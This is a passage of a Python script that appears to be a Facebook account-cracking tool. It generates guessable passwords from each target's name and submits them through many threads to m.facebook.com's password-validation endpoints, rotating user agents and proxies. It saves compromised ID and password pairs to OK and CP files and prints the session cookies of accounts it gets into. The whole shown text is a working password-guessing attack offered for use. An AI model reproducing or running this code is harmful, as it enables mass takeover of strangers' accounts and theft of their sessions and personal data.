    print(f'\033[38;5;196m┗━───────────────\033[1;37m')
    hc = input('\033[1;91m[\033[1;92m+\033[1;91m] \033[1;96mCHOOSE: ')
    #os.system("xdg-open https://www.facebook.com/profile.php?id=100082550437979")
    if hc in ['1','01']:
        method.append('mobile')
    elif hc in ['2','02']:
        method.append('free')
    else:
        method.append('mobile')
    passwrd()
    exit() 
 
#-------------------[ BAGIAN-WORDLIST ]------------#
 
def passwrd():
    os.system('clear')
    print(logo)
    print(f'\x1b[38;5;50m┏━──────────────────────────────────────────────────\033[1;37m')
    print(f"\x1b[38;5;50m┣━\033[1;91m[\033[1;92m+\033[1;91m] \033[92;1\x1b[1;97m𝚈𝙾𝚄𝚁 𝚃𝙾𝙾𝙻𝚂 𝙰𝙲𝚃𝙸𝚅𝙴 \x1b[38;5;50m[𝙿𝚁𝙴𝙼𝙸𝚄𝙼] ") 
    print(f"\x1b[38;5;50m┣━\033[1;91m[\033[1;92m+\033[1;91m] \033[92;1\x1b[1;97m𝚄𝚂𝙴𝚁 𝙽𝙰𝙼𝙴\033[1;91m :\033[1;96m "+𝚞𝚗𝚊𝚖𝚎)
    print('\x1b[38;5;50m┣━\033[1;91m[\033[1;92m+\033[1;91m] \033[41m\x1b[1;97m𝚈𝙾𝚄𝚁 𝚃𝙾𝚃𝙰𝙻 𝙸𝙳𝚣 \033[0;97m:\x1b[38;5;50m ',str(len(id)))
   # print("\033[1;91m[\033[1;92m+\033[1;91m] \033[41m\x1b[1;97m𝚂𝚃𝙰𝚁𝚃𝙴𝙳 𝚈𝙾𝚄𝚁 𝙲𝙻𝙾𝙽𝙸𝙽𝙶 𝚃𝙸𝙼𝙴\033[0;97m :> \x1b[38;5;50m"+time.strftime("%H:%M")+" "+ tag)
    print(f'\x1b[38;5;50m┣━\033[1;91m[\033[1;92m+\033[1;91m] \x1b[38;5;46m\033[1;97m𝙵𝙰𝚂𝚃 \033[1;34m[\033[1;32m𝙽𝙾\033[1;97m/\033[38;5;196m𝙾𝙵𝙵\033[1;34m] \033[1;97m𝙰𝙸𝚁𝙿𝙻𝙰𝙽𝙴 𝙼𝙾𝙳𝙴] [💙] ')
    print(f'\x1b[38;5;50m┗━──────────────────────────────────────────────────\033[1;37m')
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = []
            if len(nmf)<6:
                if len(frs)<3:
                    pass
                else:
                    pwv.append(frs+'12')
                    pwv.append(frs+'22')
                    pwv.append(frs+'@12')                                        
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'@1234')                   
                    pwv.append(nmf)
                    pwv.append('57273200')
                    pwv.append(frs+'@123')
                    pwv.append(frs+'@')
                    pwv.append(frs+'@@')
                    pwv.append(frs+'@#')
                    pwv.append(frs+'1122')
                    pwv.append(frs+'11')
                    pwv.append(frs+'#11')
                    pwv.append(frs+'@1122')
                    pwv.append(frs+'@11')
                    pwv.append(frs+'@22')                
            else:
                if len(frs)<3:
                    pwv.append(nmf)
                else:
                    pwv.append(frs+'12')
                    pwv.append(frs+'22')
                    pwv.append(frs+'@12')               
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'@1234')
                    pwv.append(nmf)
                    pwv.append('57273200')
                    pwv.append(frs+'@123')
                    pwv.append(frs+'@')
                    pwv.append(frs+'@@')
                    pwv.append(frs+'@#')
                    pwv.append(frs+'1122')
                    pwv.append(frs+'11')
                    pwv.append(frs+'#11')
                    pwv.append(frs+'@1122')
                    pwv.append(frs+'@11')
                    pwv.append(frs+'@22')
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            else:pass
            if 'mobile' in method:
                pool.submit(crack,idf,pwv)
            elif 'free' in method:
                pool.submit(crackfree,idf,pwv)
            elif 'touch' in method:
                pool.submit(crackfree,idf,pwv)
            elif 'mbasic' in method:
                pool.submit(crackfree,idf,pwv)
            else:
                pool.submit(crackfree,idf,pwv)
    print('\n\033[1;37m===================================')
    print('\033[97;1m[\033[92;1m+\033[97;1m] CLONING COMPLETE TIME :\033[1;92m'+time.strftime("%H:%M")+" "+ tag)
    print('\033[97;1m[\033[92;1m•\033[97;1m] OK :\033[0;92m %s '%(OK))
    print('\033[97;1m[\033[92;1m+\033[97;1m] CP :\033[0;93m %s '%(CP))
    print('\n\033[1;37m===================================')
    woi = input('\033[97;1m[\033[92;1m+\033[97;1m] \033[1;37m ENTER TO BACK')
    os.system("python ALAMIN-1-0.py")
    exit()
 
#--------------------[ METODE-B-API ]-----------------#
 
def crack(idf,pwv):
    global loop,ok,CP
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r\033[100;92m{bo}[NXT-ON]-{P}[{H}{loop}{P}]-[{H}{len(id)}{P}]-[{H}OK{bo}-{H}{ok}{P}]-[{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="24", "Chromium";v="116", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '1', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',}
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[10;92m\033[1;91m[\033[1;92mNXT-CP\033[1;91m] \033[10;92m\033[1;91m[\033[1;92mNUM\033[1;91m]> {idf} \033[10;92m\033[1;91m[\033[1;92mPASS\033[1;91m]> \033[1;92m{pw}')
                print(f'\033[38;5;196m────────────────────────────────────────────────\033[1;37m')
                os.system('espeak -a 300 " CP, ID"')
                open('CP/'+CPc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                CP+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m\033[1;91m[\033[1;92mNXT-OK\033[1;91m] \033[10;92m\033[1;91m[\033[1;92mNUM\033[1;91m]> \x1b[38;5;50m{idf} \033[10;92m\033[1;91m[\033[1;92mPASS\033[1;91m]> \x1b[38;5;50m{pw}\n\x1b[38;5;50 \033[1;91m[🌺]\033[1;91m=\033[1;92m= \x1b[38;5;50m{kuki} ')
                print(f'\033[38;5;196m────────────────────────────────────────────────\033[1;37m')
                os.system('espeak -a 300 " NXT,  Ok,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
                
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1
 
#------------------[ METHODE-MBASIC-2 ]-------------------#
 
def crackfree(idf,pwv):
    global loop,ok,CP
    sys.stdout.write(f"\r{H}[NXT -ON]{P}-[{H}{loop}{P}]{P}-[{H}{len(id)}{P}]-[OK{P}-{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="24", "Chromium";v="116", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '1', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',}
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[10;92m\033[1;91m[\033[1;92mNXT-Cp🖤\033[1;91m] {idf} • {pw}')
                print(f'\033[38;5;196m───────────────────────────────────────────────\033[1;37m')
                os.system('espeak -a 300 " CP, ID"')
                open('CP/'+CPc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                CP+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•NXT-Ok💙] \033[1;92m{idf} • \033[1;92m{pw} ')
                print(f'\033[38;5;196m────────────────────────────────────────────────\033[1;37m')
                os.system('espeak -a 300 " NXT ,  Ok,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
                
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1
 
#-----------------------[ SYSTEM-CONTROL ]--------------------#
 
if __name__=='__main__':
    try:os.mkdir('OK')
    except:pass
    try:os.mkdir('CP')
    except:pass
    try:os.system('touch .prox.txt')
    except:pass
menu()